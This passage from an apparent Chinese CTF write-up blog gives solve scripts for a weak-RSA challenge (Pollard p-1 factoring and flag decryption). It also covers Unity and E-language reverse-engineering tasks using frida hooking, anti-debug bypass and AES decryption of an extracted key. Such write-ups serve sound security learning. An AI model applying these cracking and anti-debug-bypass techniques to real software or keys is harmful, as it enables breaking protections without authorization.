punctuation">(</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> p<span class="token operator">+</span><span class="token number">1</span>p <span class="token operator">=</span> getBabyPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getBabyPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qgift1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">pow</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> ngift2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token operator">+</span>q<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>t <span class="token operator">=</span> <span class="token number">65537</span>x <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>e<span class="token punctuation">)</span>y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> powmod<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'gift1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>gift1<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'gift2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>gift2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'y = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>y<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''n = 39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321gift1 = 4549402444746338327349007235818187793950285105091726167573552412678416759694660166956782755631447271662108564084382098562999950228708300902201571583419116299932264478381197034402338481872937576172197202519770782458343606060544694608852844228400457232100904217062914047342663534138668490328400022651816597367310gift2 = 111061215998959709920736448050860427855012026815376672067601244053580566359594802604251992986382187891022583247997994146019970445247509119719411310760491983876636264003942870756402328634092146799825005835867245563420135253048223898334460067523975023732153230791136870324302259127159852763634051238811969161011462c = 16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043y = 1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>=</mo><msup><mi>p</mi><mi>e</mi></msup><mo>−</mo><msup><mi>q</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo><mspace width="1em"/><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gift1=p^e-q^e (mod n)\quadgift2=(p+q)^e(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>由二项式定理</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>=</mo><msup><mi>p</mi><mi>e</mi></msup><mo>+</mo><msup><mi>q</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gift2=p^e+q^e(modn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>则</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>+</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>≡</mo><mn>2</mn><msup><mi>p</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo><mspace width="1em"/><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>−</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>≡</mo><mn>2</mn><msup><mi>q</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gift1+gift2\equiv2p^e(mod n)\quadgift2-gift1\equiv2q^e(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>那么</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>p</mi><mi>e</mi></msup><mo>=</mo><mfrac><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn><mo>+</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo><mspace width="1em"/><msup><mi>q</mi><mi>e</mi></msup><mo>=</mo><mfrac><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>2</mn><mo>−</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mn>1</mn></mrow><mn>2</mn></mfrac><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p^e=\frac {gift1+gift2}{2}(mod n)\quadq^e=\frac {gift2-gift1}{2}(mod n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.0574399999999997em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714399999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.0574399999999997em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714399999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p>然后就没什么思路了</p><p>其实这个题跟第一个等式没什么关系</p><p>利用B光滑数算法可以求出p，q</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> N <span class="token operator">=</span> <span class="token number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span> a<span class="token operator">=</span><span class="token number">2</span> n<span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span> a <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">,</span> N<span class="token punctuation">)</span> res <span class="token operator">=</span> gcd<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">if</span> res <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> res <span class="token operator">!=</span> N<span class="token punctuation">:</span> q <span class="token operator">=</span> N <span class="token operator">//</span> res <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p="</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q="</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span> <span class="token keyword">break</span> n <span class="token operator">+=</span> <span class="token number">1</span> <span class="token triple-quoted-string string">''' n= 97241 p= 2364384004775215979229504451537962651990724045771831909531148051705228759045517 80358338769440558816351105253794964040981919231484098097671084895302287425479 q= 1663537893730573521952685751683977503626438222012535089410528359454206249832164 56266478176579651490080696973849607356408696043718492499993062863415424578199 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">t<span class="token operator">=</span><span class="token number">65537</span>p<span class="token operator">=</span><span class="token number">23643840047752159792295044515379626519907240457718319095311480517052287590455</span> <span class="token number">1780358338769440558816351105253794964040981919231484098097671084895302287425479</span> q<span class="token operator">=</span><span class="token number">16635378937305735219526857516839775036264382220125350894105283594542062498321</span> <span class="token number">6456266478176579651490080696973849607356408696043718492499993062863415424578199</span> N<span class="token operator">=</span><span class="token number">39332423872740210783246069030855946244104982381157166843977599780233911183158</span> <span class="token number">5609013773599254350923266533039642615501586585515186260140487834352454715369598</span> <span class="token number">4487403651693154244471954999797148264490552345940777539270221108614927947378479</span> <span class="token number">6202020281909706723380472571862792003687423791576530085747716706475220532321</span> y<span class="token operator">=</span><span class="token number">18136500012709677098413064912977169089694252488885109851093818812703627550313</span> <span class="token number">8556492786931311254053478085396634104452685670558902029504847330576208878699244</span> <span class="token number">6350060024881117741041260391405962817182674421715239197211274668450947666394594</span> <span class="token number">121764333794138308442124114744892164155894256326961605137479286082964520217</span> <span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> d<span class="token operator">=</span>invert<span class="token punctuation">(</span>t<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个应该是非预期解</p><hr /><h1 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h1><h2 id="reverse-2"><a class="markdownIt-Anchor" href="#reverse-2"></a> Reverse</h2><h3 id="ezunity"><a class="markdownIt-Anchor" href="#ezunity"></a> ezunity</h3><p>​其实与babyunity思路一致：</p><p>这里有两种想法：一是修复gm.dat；二是利用il2cpp-bridge-frida进行hook</p><p><code>不会trace导致卡了，浪费很多时间</code></p><p><code>trace真是个好东西</code></p><p>先说思路一（修复gm.dat）：把第一排改成AF 1B B1 FA 1D 00 00 00 00 01 00 00，删几个字符，让后面接着C0 B2 然后把下面的内容对齐 直接dumper导入，导入成功！然后沿用babyunity的方法直接静态分析即可</p><p>再说思路二（用frida进行hook）</p><p><a href="https://blog.csdn.net/weixin_44292683/article/details/132125663">记frida-il2cpp-bridge的使用-CSDN博客</a></p><p>这个教程讲的比较浅，frida还是需要深入学习，确实hook很方便</p><p>搭好环境，写个脚本，跟踪这个程序</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token keyword">import</span> <span class="token string">"frida-il2cpp-bridge"</span><span class="token punctuation">;</span>Il2Cpp<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Unity version: "</span> <span class="token operator">+</span> Il2Cpp<span class="token punctuation">.</span>unityVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> ass <span class="token operator">=</span> Il2Cpp<span class="token punctuation">.</span>domain<span class="token punctuation">.</span><span class="token function">assembly</span><span class="token punctuation">(</span><span class="token string">"Assembly-CSharp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             Il2Cpp<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">assemblies</span><span class="token punctuation">(</span>ass<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// const Assembly = Il2Cpp.domain.assembly("Assembly-CSharp").image;</span>    <span class="token keyword">const</span> SystemString <span class="token operator">=</span> Il2Cpp<span class="token punctuation">.</span>corlib<span class="token punctuation">.</span><span class="token function">class</span><span class="token punctuation">(</span><span class="token string">"System.String"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Il2Cpp<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">classes</span><span class="token punctuation">(</span>SystemString<span class="token punctuation">)</span>         <span class="token punctuation">.</span><span class="token function">classes</span><span class="token punctuation">(</span>SystemString<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// console.log("Assembly-CSharp: " + Assembly)</span>    <span class="token comment">// console.log("System.String: " + SystemString);</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>61179</p><p>显然是AES加密</p><p>61246</p><h3 id="e-language"><a class="markdownIt-Anchor" href="#e-language"></a> e language</h3><p><a href="https://www.52pojie.cn/thread-1414525-1-1.html">IDA7.5支持中文函数命名的办法 - 『逆向资源区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><p><a href="https://github.com/fjqisba/E-Decompiler">fjqisba/E-Decompiler: 用来辅助分析易语言程序的IDA插件 (github.com)</a></p><p>61563</p><p>易语言逆向，<s>又成脚本小子了</s>   找到隐藏按钮的函数</p><p>61674</p><img src="https://s2.loli.net/2024/04/29/k2NcySwIFOGPXMB.png" alt="image-20240429142439097"  / loading="lazy"><p>61851</p><p>动调提取key，再提密文</p><p>61945</p><p>62025</p><p>然而是个假flag</p><p>62116</p><p>综合多个wp，事实上这道题的情况是有一个反调试，如果检测到debugger的存在，就会给函数假数据和假key，<s>其实这道题abctf已经给了提示了</s>，我们就要想办法绕过这个反调</p><p>思路一是找到这个反调函数然后nop掉</p><p>思路二是用反反调试插件<a href="https://github.com/notify-bibi/ScyllaHide-IDA7.5">notify-bibi/ScyllaHide-IDA7.5: ScyllaHide for IDA7.5; ScyllaHide IDA7.5; It is a really niccccccce anti-anti-debug tool (github.com)</a></p><p>这道题的反调试比较简单，直接附加就可以绕过</p><p>然后重复以上的过程获得</p><p><code>key:welcometoxyctf!!</code></p><p><code>enc:RZy/zVEWMFxaCbzChAg8x26XZYr51rNVnM+zBoBp3gya93L9QQXpFRin1JE33vyx</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> base64enc<span class="token operator">=</span><span class="token string">b'RZy/zVEWMFxaCbzChAg8x26XZYr51rNVnM+zBoBp3gya93L9QQXpFRin1JE33vyx'</span>enc_b64decode<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc_b64decode<span class="token punctuation">)</span>key<span class="token operator">=</span><span 